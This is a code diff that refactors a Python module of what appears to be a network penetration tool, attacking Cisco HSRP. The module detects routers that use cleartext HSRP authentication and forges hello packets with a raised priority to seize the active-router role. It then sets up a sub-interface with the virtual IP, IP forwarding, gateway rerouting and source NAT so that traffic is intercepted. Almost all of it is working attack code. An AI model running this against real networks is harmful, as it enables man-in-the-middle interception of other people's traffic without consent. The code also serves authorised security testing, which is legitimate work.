@@ -18,53 +18,48 @@ from protocols.hsrp_packet import HSRP_PACKET
 
 
 def detect_if_vulnerable(packet):
-    if (packet.haslayer('HSRP')):
-        _, source_ip, _, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
+    if not (packet.haslayer('HSRP')):
+        return False
+    _, source_ip, _, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
 
         # HSRPv2 multicasts to a different IP
-        if (destination_ip == '224.0.0.102'):
-            bytes_packet = bytes_hex(packet[3])
+    if (destination_ip == '224.0.0.102'):
+        bytes_packet = bytes_hex(packet[3])
 
-            state = int(bytes_packet[4*2:(4*2)+1*2])
-            priority = int(bytes_packet[14*2:(14*2)+4*2],16)
-            group_state_length = int(bytes_packet[1*2:(1*2)+1*2],16)
-            auth_type = int(bytes_packet[(group_state_length+2)*2:((group_state_length+2)*2)+1*2],16)
+        state = int(bytes_packet[4*2:(4*2)+1*2])
+        group_state_length = int(bytes_packet[1*2:(1*2)+1*2],16)
+        auth_type = int(
+            bytes_packet[
+                (group_state_length + 2) * 2 : ((group_state_length + 2) * 2)
+                + 1 * 2
+            ],
+            16,
+        )
 
             # Auth type 3 means that its in the clear.
-            if (auth_type == 3):
-                if (state == 6):
-                    if (priority < 255):
-                        return True
-                    elif (ipaddress.IPv4Address(utility.get_ip_address_from_interface(user_var.interface)) > ipaddress.IPv4Address(source_ip)):
-                        return True
-                    else:
-                        return False 
-
-        # HSRPv1                   
-        else:
-            if (packet.haslayer('HSRP MD5 Authentication')):
-                # MD5 authentication detected, at current moment nothing we can do about attacking this.
-                pass
+        if (auth_type == 3) and (state == 6):
+            priority = int(bytes_packet[14*2:(14*2)+4*2],16)
+            if (priority < 255):
+                return True
+            elif (ipaddress.IPv4Address(utility.get_ip_address_from_interface(user_var.interface)) > ipaddress.IPv4Address(source_ip)):
+                return True
             else:
-                # A state with 16 means they are the master/active
-                if(packet['HSRP'].state == 16):
-                    if(packet['HSRP'].priority < 255):
-                        #Detected a vulnerable condition, HSRP packets have a priority of less than 254, authentication is cleartext.
-                        #Actually, if you find the priority to be 254/max, there is still a chance to attack this. You will need to obtain a high IP address.
-                        #Refer to priority definition within https://tools.ietf.org/html/rfc2281#section-5.7.
-                        return True
+                return False 
 
-                        #Check if our IP address is higher, then we still have a chance if max priority is used.
-                    elif (ipaddress.IPv4Address(utility.get_ip_address_from_interface(user_var.interface)) > ipaddress.IPv4Address(source_ip)):
-                        return True
-                    else:
-                        return False
-                else:
-                    # recieved a packet belonging to standby router, we can ignore.
-                    # FIXME look at improving the filter to only get active packets
-                    pass
-    else:
-        return False
+    elif not (packet.haslayer('HSRP MD5 Authentication')) and (
+        packet['HSRP'].state == 16
+    ):
+        if(packet['HSRP'].priority < 255):
+            #Detected a vulnerable condition, HSRP packets have a priority of less than 254, authentication is cleartext.
+            #Actually, if you find the priority to be 254/max, there is still a chance to attack this. You will need to obtain a high IP address.
+            #Refer to priority definition within https://tools.ietf.org/html/rfc2281#section-5.7.
+            return True
+
+            #Check if our IP address is higher, then we still have a chance if max priority is used.
+        elif (ipaddress.IPv4Address(utility.get_ip_address_from_interface(user_var.interface)) > ipaddress.IPv4Address(source_ip)):
+            return True
+        else:
+            return False
 
 def get_packet_data(packet):
     _, source_ip, _, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
@@ -122,26 +117,28 @@ def get_packet_data_v2(packet):
     return source_mac, source_ip, destination_mac, destination_ip, 2, state, hello_interval, dead_interval, priority, group, auth_data, identifier, virtual_ip
 
 def check_if_same(packet1, packet2):
-    if packet1.source_ip == packet2.source_ip and packet1.group == packet2.group and packet1.authentication == packet2.authentication:
-        return True
-    else:
-        return False
+    return (
+        packet1.source_ip == packet2.source_ip
+        and packet1.group == packet2.group
+        and packet1.authentication == packet2.authentication
+    )
 
 def hsrp_scan_start(packet):
 
     def detect_network_protocol(packet):
-        if packet.haslayer('HSRP'):
-            if detect_if_vulnerable(packet):
-                new_vulnerable_hsrp_packet = HSRP_PACKET()
-                new_vulnerable_hsrp_packet.set_data(*get_packet_data(packet), True)
-                exists = False
+        if not packet.haslayer('HSRP'):
+            return
+        if detect_if_vulnerable(packet):
+            new_vulnerable_hsrp_packet = HSRP_PACKET()
+            new_vulnerable_hsrp_packet.set_data(*get_packet_data(packet), True)
+            exists = False
 
-                for vulnerable_hsrp_packet in vulnerable_hsrp_packets:
-                    if (check_if_same(new_vulnerable_hsrp_packet, vulnerable_hsrp_packet)):
-                        exists = True
-                
-                if (not exists):
-                    vulnerable_hsrp_packets.append(new_vulnerable_hsrp_packet)
+            for vulnerable_hsrp_packet in vulnerable_hsrp_packets:
+                if (check_if_same(new_vulnerable_hsrp_packet, vulnerable_hsrp_packet)):
+                    exists = True
+
+            if (not exists):
+                vulnerable_hsrp_packets.append(new_vulnerable_hsrp_packet)
 
     detect_network_protocol(packet)
 
@@ -152,13 +149,11 @@ def payload_hsrp_packet_v1(hsrp_packet):
 
     priority = hsrp_packet.priority
 
-    if (hsrp_packet.priority == 255):
-        pass
-    else:
+    if hsrp_packet.priority != 255:
         priority = priority + 1
 
     payload_packet = payload_packet / HSRP(hellotime=hsrp_packet.hello_interval, holdtime=hsrp_packet.dead_interval, priority=priority, group=hsrp_packet.group, virtualIP=hsrp_packet.virtual_ip, auth=hsrp_packet.authentication)
-    
+
     return payload_packet
 
 def payload_hsrp_packet_v2(hsrp_packet):
@@ -168,14 +163,12 @@ def payload_hsrp_packet_v2(hsrp_packet):
 
     priority = hsrp_packet.priority
 
-    if (hsrp_packet.priority == 255):
-        pass
-    else:
+    if hsrp_packet.priority != 255:
         priority = priority + 1
 
     #Padded with 12 null bytes for IPv4.
     payload_packet = payload_packet / (struct.pack('B', 1)+struct.pack('B', 40)+struct.pack('B', hsrp_packet.version)+struct.pack('B', 0)+struct.pack('B', hsrp_packet.state)+struct.pack('B', 4)+struct.pack('>H', hsrp_packet.group)+bytearray.fromhex(hsrp_packet.identifier)+struct.pack('>I', priority)+struct.pack('>I', hsrp_packet.hello_interval)+struct.pack('>I', hsrp_packet.dead_interval)+struct.pack('>L', int(ipaddress.IPv4Address(hsrp_packet.virtual_ip)))+(struct.pack('B', 0)*12)+struct.pack('B', 3)+struct.pack('B', 8)+bytearray.fromhex(hsrp_packet.authentication.encode("utf-8").hex())+(struct.pack('B', 0)*(8-len(hsrp_packet.authentication))))
-    
+
     return payload_packet
 
 def send_hsrp_packet(hsrp_packet,count):
@@ -199,22 +192,31 @@ def send_hsrp_packet(hsrp_packet,count):
         sendp(payload_packet, iface=user_var.interface, loop=1, verbose=0, inter=interval)
     else:
         sendp(payload_packet, iface=user_var.interface, count=count, verbose=0, inter=interval)
-    
+
     clean_up()
 
 def prepare_environment(hsrp_packet):
 
     netmask = utility.get_interface_netmask(user_var.interface)
-    
-    print('Preparing environment - Adding sub interface 99 to {}'.format(user_var.interface))
-    subprocess.Popen(['ifconfig {}:99 {} netmask {} up'.format(user_var.interface,hsrp_packet.virtual_ip, netmask)], stdout=subprocess.PIPE,
-                        shell=True)
+
+    print(
+        f'Preparing environment - Adding sub interface 99 to {user_var.interface}'
+    )
+
+    subprocess.Popen(
+        [
+            f'ifconfig {user_var.interface}:99 {hsrp_packet.virtual_ip} netmask {netmask} up'
+        ],
+        stdout=subprocess.PIPE,
+        shell=True,
+    )
+
 
     if not hsrp_config.ipv4_forward_enabled:
         print('Preparing environment - Enabling IP forwarding')
         subprocess.Popen(['sysctl -w net.ipv4.ip_forward=1'], stdout=subprocess.PIPE, shell=True)
 
-    if not utility.get_default_gateway() == hsrp_packet.virtual_ip:
+    if utility.get_default_gateway() != hsrp_packet.virtual_ip:
         # Our gateway isn't the same and results may not be the same.
         print('Found that the default gateway set is not the same as the virtual IP in the HSRP configuration')
         hsrp_config.set_default_gateway(utility.get_default_gateway())
@@ -224,13 +226,19 @@ def prepare_environment(hsrp_packet):
 
     # FIXME gateways without a netmask of 0? See if we can extract full info? Right now hard coded
 
-    print('Preparing environment - Changing the default gateway from {} to {}'.format(utility.get_default_gateway(), hsrp_packet.source_ip))
+    print(
+        f'Preparing environment - Changing the default gateway from {utility.get_default_gateway()} to {hsrp_packet.source_ip}'
+    )
+
 
     utility.edit_specific_route('0.0.0.0', utility.get_default_gateway(), '0.0.0.0', 'del')
     utility.edit_specific_route('0.0.0.0', hsrp_packet.source_ip, '0.0.0.0', 'add') 
 
     # We need to source NAT it in some way
-    print('Preparing environment - Adding iptable rule to do source NAT on interface {}'.format(user_var.interface))
+    print(
+        f'Preparing environment - Adding iptable rule to do source NAT on interface {user_var.interface}'
+    )
+
     utility.iptablesSNAT('insert', user_var)
 
 
@@ -245,16 +253,26 @@ def clean_up():
 
     # Revert gateway changes
 
-    print('Cleaning up environment - Changing the default gateway back to {}'.format(hsrp_config.default_gateway))
+    print(
+        f'Cleaning up environment - Changing the default gateway back to {hsrp_config.default_gateway}'
+    )
+
 
     utility.edit_specific_route('0.0.0.0', utility.get_default_gateway(), '0.0.0.0', 'del')
     utility.edit_specific_route('0.0.0.0', hsrp_config.default_gateway, '0.0.0.0', 'add')  
 
-    print('Cleaning up environment - Removing iptable rule to do source NAT on interface {}'.format(user_var.interface))
+    print(
+        f'Cleaning up environment - Removing iptable rule to do source NAT on interface {user_var.interface}'
+    )
+
     utility.iptablesSNAT('remove', user_var)
 
     print('Cleaning up environment - Removing created interface')
-    subprocess.Popen(['ifconfig {}:99 down'.format(user_var.interface)], stdout=subprocess.PIPE, shell=True)
+    subprocess.Popen(
+        [f'ifconfig {user_var.interface}:99 down'],
+        stdout=subprocess.PIPE,
+        shell=True,
+    )
 
 def keyboard_interrupt_handler(signal, frame):
     print("Interrupt recieved. Cleaning up...".format(signal))
